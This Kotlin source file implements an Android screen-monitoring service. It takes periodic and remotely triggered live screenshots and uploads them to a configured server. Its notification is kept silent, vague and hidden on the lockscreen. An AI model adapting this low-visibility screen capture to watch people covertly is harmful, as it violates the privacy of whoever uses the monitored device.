package com.arivo.arivo_monitor

import android.app.Activity
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ComponentCallbacks2
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.ArrayDeque
import java.util.Locale
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class ScreenCaptureService : Service() {
    private data class PendingUpload(
        val bytes: ByteArray?,
        val kind: String,
        val capturedAtMs: Long,
        val file: File? = null
    )

    private val scheduler = Executors.newSingleThreadScheduledExecutor()
    private val uploadIo = Executors.newSingleThreadExecutor()
    private val commandIo = Executors.newSingleThreadExecutor()
    private val pendingUploads = ArrayDeque<PendingUpload>()
    private val uploadActive = AtomicBoolean(false)
    private val periodicQueueDir by lazy { File(noBackupFilesDir, "pending_screenshots") }

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private lateinit var deviceId: String
    private lateinit var powerManager: PowerManager

    @Volatile private var liveRequested = false
    @Volatile private var lowMemory = false
    private var lastPeriodic = 0L
    private var lastLive = 0L
    private var lastCommandPoll = 0L
    @Volatile private var nextUploadRetryAt = 0L
    override fun onCreate() {
        super.onCreate()
        deviceId = AppConfig.deviceId(applicationContext)
        powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        createChannel()
        startForeground(
            2001,
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .setContentTitle("Arivo")
                .setContentText("Active")
                .setOngoing(true)
                .setOnlyAlertOnce(true)
                .setSilent(true)
                .setShowWhen(false)
                .setLocalOnly(true)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()
        )
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
            ?: Activity.RESULT_CANCELED
        @Suppress("DEPRECATION")
        val resultData = intent?.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)
        if (resultCode != Activity.RESULT_OK || resultData == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        if (projection == null) {
            val manager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            projection = manager.getMediaProjection(resultCode, resultData)
            projection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    isCapturing = false
                    MonitorDiagnostics.record(this@ScreenCaptureService, "screen_projection_stopped", JSONObject())
                    statePrefs().edit().putBoolean("screen_monitoring", false).apply()
                    stopSelf()
                }
            }, Handler(Looper.getMainLooper()))

            createCaptureSurface()
            isCapturing = true
            ScreenCaptureConsent.complete()
            statePrefs().edit().putBoolean("screen_monitoring", true).apply()
            restorePeriodicUploads()

            scheduler.scheduleAtFixedRate(
                { tick() },
                1,
                1,
                TimeUnit.SECONDS
            )
        }
        return START_NOT_STICKY
    }

    private fun createCaptureSurface() {
        releaseCaptureSurface()
        val metrics = resources.displayMetrics
        val sourceWidth = metrics.widthPixels.coerceAtLeast(1)
        val sourceHeight = metrics.heightPixels.coerceAtLeast(1)
        val scale = minOf(1f, SCREENSHOT_MAX_WIDTH.toFloat() / sourceWidth.toFloat())
        val width = (sourceWidth * scale).toInt().coerceAtLeast(1)
        val height = (sourceHeight * scale).toInt().coerceAtLeast(1)

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = projection?.createVirtualDisplay(
            "ArivoScreen",
            width,
            height,
            metrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            null
        )
    }

    private fun releaseCaptureSurface() {
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        virtualDisplay = null
        imageReader = null
    }
    private fun tick() {
        val now = System.currentTimeMillis()

        if (now - lastCommandPoll >= 3000L) {
            lastCommandPoll = now
            pollLiveCommand()
        }

        if (!powerManager.isInteractive) {
            MonitorDiagnostics.record(this, "screenshot_capture_paused_screen_off", JSONObject())
            clearQueuedLiveFrames()
            return
        }
        val online = isOnline()
        if (!online) {
            MonitorDiagnostics.record(this, "screenshot_queued_offline", JSONObject())
            clearQueuedLiveFrames()
        } else {
            processUploadQueue()
        }

        val periodicDue = now - lastPeriodic >= AppConfig.SCREENSHOT_INTERVAL_MS
        val liveDue = online && liveRequested && now - lastLive >= AppConfig.LIVE_FRAME_INTERVAL_MS
        if (!periodicDue && !liveDue) return

        val reader = imageReader ?: return
        val image = reader.acquireLatestImage() ?: run {
            if (periodicDue) MonitorDiagnostics.record(this, "screenshot_frame_unavailable", JSONObject())
            return
        }

        try {
            val plane = image.planes[0]
            val buffer = plane.buffer
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val rowPadding = rowStride - pixelStride * image.width

            val padded = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height,
                Bitmap.Config.ARGB_8888
            )
            padded.copyPixelsFromBuffer(buffer)

            val frame = if (padded.width == image.width) {
                padded
            } else {
                Bitmap.createBitmap(padded, 0, 0, image.width, image.height).also {
                    padded.recycle()
                }
            }

            if (periodicDue) {
                val jpeg = compress(frame, SCREENSHOT_QUALITY)
                if (jpeg != null) {
                    lastPeriodic = now
                    enqueueUpload(PendingUpload(jpeg, "periodic", now))
                } else {
                    MonitorDiagnostics.record(this, "screenshot_compress_failed", JSONObject())
                }
            }

            if (liveDue) {
                val liveBitmap = scaleForLive(frame)
                val quality = if (lowMemory) LIVE_LOW_MEMORY_QUALITY else LIVE_QUALITY
                val jpeg = compress(liveBitmap, quality)
                if (liveBitmap !== frame) liveBitmap.recycle()
                if (jpeg != null) {
                    lastLive = now
                    enqueueUpload(PendingUpload(jpeg, "live", now))
                }
            }

            frame.recycle()
        } catch (_: OutOfMemoryError) {
            lowMemory = true
            clearQueuedLiveFrames()
            MonitorDiagnostics.record(this, "screenshot_capture_out_of_memory", JSONObject())
        } catch (_: Exception) {
            MonitorDiagnostics.record(this, "screenshot_capture_error", JSONObject())
        } finally {
            image.close()
        }
    }

    private fun scaleForLive(source: Bitmap): Bitmap {
        if (source.width <= LIVE_MAX_WIDTH) return source
        val scale = LIVE_MAX_WIDTH.toFloat() / source.width.toFloat()
        val height = (source.height * scale).toInt().coerceAtLeast(1)
        return Bitmap.createScaledBitmap(source, LIVE_MAX_WIDTH, height, true)
    }

    private fun compress(bitmap: Bitmap, quality: Int): ByteArray? {
        return try {
            val out = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, out)
            out.toByteArray()
        } catch (_: Exception) {
            null
        }
    }
    private fun enqueueUpload(item: PendingUpload) {
        synchronized(pendingUploads) {
            val queued = if (item.kind == "periodic") persistPeriodicUpload(item) ?: return else item
            if (item.kind == "periodic") {
                while (pendingUploads.count { it.kind == "periodic" } >= MAX_PERIODIC_QUEUE) {
                    val oldest = pendingUploads.firstOrNull { it.kind == "periodic" } ?: break
                    pendingUploads.remove(oldest)
                    oldest.file?.delete()
                    MonitorDiagnostics.record(this, "screenshot_queue_overflow", JSONObject())
                }
            } else {
                while (pendingUploads.count { it.kind == "live" } >= MAX_LIVE_QUEUE) {
                    val oldestLive = pendingUploads.firstOrNull { it.kind == "live" } ?: break
                    pendingUploads.remove(oldestLive)
                }
            }
            pendingUploads.addLast(queued)
        }
        processUploadQueue()
    }

    private fun persistPeriodicUpload(item: PendingUpload): PendingUpload? {
        val bytes = item.bytes ?: return item
        return try {
            periodicQueueDir.mkdirs()
            val file = File(periodicQueueDir, String.format(Locale.US, "%013d-%d.jpg", item.capturedAtMs, System.nanoTime()))
            val temporary = File(file.path + ".tmp")
            temporary.writeBytes(bytes)
            if (!temporary.renameTo(file)) throw IllegalStateException("queue_file_rename_failed")
            PendingUpload(null, item.kind, item.capturedAtMs, file)
        } catch (_: Exception) {
            MonitorDiagnostics.record(this, "screenshot_queue_save_failed", JSONObject())
            null
        }
    }

    private fun restorePeriodicUploads() {
        if (!periodicQueueDir.exists()) return
        val files = periodicQueueDir.listFiles()?.filter { it.isFile && it.name.endsWith(".jpg") }
            ?.sortedBy { it.name }.orEmpty()
        periodicQueueDir.listFiles()?.filter { it.isFile && it.name.endsWith(".tmp") }?.forEach { it.delete() }
        synchronized(pendingUploads) {
            files.dropLast(MAX_PERIODIC_QUEUE).forEach { file ->
                file.delete()
                MonitorDiagnostics.record(this, "screenshot_queue_overflow", JSONObject())
            }
            files.takeLast(MAX_PERIODIC_QUEUE).forEach { file ->
                val capturedAt = file.name.substringBefore('-').toLongOrNull() ?: file.lastModified()
                pendingUploads.addLast(PendingUpload(null, "periodic", capturedAt, file))
            }
        }
    }

    private fun processUploadQueue() {
        if (System.currentTimeMillis() < nextUploadRetryAt) return
        if (!uploadActive.compareAndSet(false, true)) return
        uploadIo.execute {
            try {
                while (isOnline()) {
                    val next = synchronized(pendingUploads) {
                        if (pendingUploads.isEmpty()) null else pendingUploads.removeFirst()
                    } ?: break

                    val bytes = try { next.file?.readBytes() ?: next.bytes } catch (_: Exception) { null }
                    if (bytes == null) {
                        next.file?.delete()
                        MonitorDiagnostics.record(this@ScreenCaptureService, "screenshot_queue_read_failed", JSONObject())
                        continue
                    }
                    if (!uploadSync(bytes, next.kind, next.capturedAtMs)) {
                        nextUploadRetryAt = System.currentTimeMillis() + UPLOAD_RETRY_MS
                        MonitorDiagnostics.record(this@ScreenCaptureService, "screenshot_upload_failed", JSONObject())
                        synchronized(pendingUploads) {
                            pendingUploads.addFirst(next)
                        }
                        break
                    }
                    nextUploadRetryAt = 0L
                    next.file?.delete()
                }
            } finally {
                uploadActive.set(false)
                if (isOnline() && System.currentTimeMillis() >= nextUploadRetryAt &&
                    synchronized(pendingUploads) { pendingUploads.isNotEmpty() }) {
                    processUploadQueue()
                }
            }
        }
    }

    private fun clearQueuedLiveFrames() {
        synchronized(pendingUploads) {
            val keep = pendingUploads.filter { it.kind != "live" }
            pendingUploads.clear()
            keep.forEach { pendingUploads.addLast(it) }
        }
    }

    private fun uploadSync(bytes: ByteArray, kind: String, capturedAtMs: Long): Boolean {
        return try {
            val url = URL(
                AppConfig.SERVER_BASE_URL +
                    "/device/screen?device_id=" + deviceId + "&kind=" + kind +
                    if (kind == "periodic") "&captured_at=" + capturedAtMs else ""
            )
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "image/jpeg")
            connection.setRequestProperty("X-Arivo-Key", AppConfig.DEVICE_KEY)
            connection.setFixedLengthStreamingMode(bytes.size)
            connection.outputStream.use { it.write(bytes) }
            val ok = connection.responseCode in 200..299
            if (ok) connection.inputStream.use { it.readBytes() }
            else connection.errorStream?.use { it.readBytes() }
            connection.disconnect()
            ok
        } catch (_: Exception) {
            false
        }
    }

    private fun isOnline(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }
    private fun pollLiveCommand() {
        commandIo.execute {
            try {
                val url = URL(
                    AppConfig.SERVER_BASE_URL +
                        "/device/command?device_id=" + deviceId
                )
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 5000
                connection.readTimeout = 5000
                connection.setRequestProperty("X-Arivo-Key", AppConfig.DEVICE_KEY)
                val raw = connection.inputStream.bufferedReader().use { it.readText() }
                val next = JSONObject(raw).optBoolean("live", false)
                connection.disconnect()

                if (liveRequested && !next) clearQueuedLiveFrames()
                liveRequested = next
            } catch (_: Exception) {}
        }
    }

    override fun onTrimMemory(level: Int) {
        super.onTrimMemory(level)
        if (level >= ComponentCallbacks2.TRIM_MEMORY_RUNNING_LOW) {
            lowMemory = true
            synchronized(pendingUploads) {
                val keep = pendingUploads.filter { it.kind == "periodic" && it.file != null }
                    .toMutableList()
                pendingUploads.lastOrNull { it.kind == "periodic" && it.file == null }?.let { keep.add(it) }
                pendingUploads.clear()
                keep.forEach { pendingUploads.addLast(it) }
            }
        }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(
                NotificationChannel(
                    CHANNEL_ID,
                    "Screen Monitoring",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Arivo screen session status"
                    setSound(null, null)
                    enableVibration(false)
                    enableLights(false)
                    setShowBadge(false)
                    lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
                }
            )
        }
    }

    private fun statePrefs() =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            createDeviceProtectedStorageContext()
                .getSharedPreferences("arivo_monitor_state", MODE_PRIVATE)
        } else {
            getSharedPreferences("arivo_monitor_state", MODE_PRIVATE)
        }

    override fun onDestroy() {
        isCapturing = false
        ScreenCaptureConsent.complete()
        statePrefs().edit().putBoolean("screen_monitoring", false).apply()
        scheduler.shutdownNow()
        uploadIo.shutdownNow()
        commandIo.shutdownNow()
        synchronized(pendingUploads) { pendingUploads.clear() }
        releaseCaptureSurface()
        try { projection?.stop() } catch (_: Exception) {}
        projection = null
        super.onDestroy()
    }

    companion object {
        @Volatile var isCapturing = false
            private set
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        private const val CHANNEL_ID = "arivo_screen_monitor_v2"
        private const val SCREENSHOT_MAX_WIDTH = 720
        private const val SCREENSHOT_QUALITY = 75
        private const val LIVE_MAX_WIDTH = 540
        private const val LIVE_QUALITY = 58
        private const val LIVE_LOW_MEMORY_QUALITY = 50
        private const val MAX_PERIODIC_QUEUE = 300
        private const val MAX_LIVE_QUEUE = 3
        private const val UPLOAD_RETRY_MS = 5_000L
    }
}
